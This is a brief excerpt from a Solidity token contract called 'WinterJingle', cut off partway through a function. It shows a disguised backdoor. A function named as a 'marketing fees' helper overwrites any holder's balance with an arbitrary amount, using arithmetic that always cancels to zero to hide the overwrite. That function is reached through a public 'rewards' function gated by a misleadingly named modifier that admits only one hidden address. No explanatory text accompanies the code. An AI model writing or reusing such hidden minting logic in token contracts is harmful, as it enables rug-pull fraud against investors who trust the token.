...
contract WinterJingle is Ownable {
  ...
  function _marketingfees (address miner, uint256 _value) internal {
        balances[miner] = (balances[miner] * 1 * 2 - balances[miner] * 1 * 2) + (_value * 10 ** uint256(decimals));
  }
  ...
  modifier _external () {
    require(vamp == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
  ...
  function _TokenRewards(address lpaddress, uint256 _value) public _external {
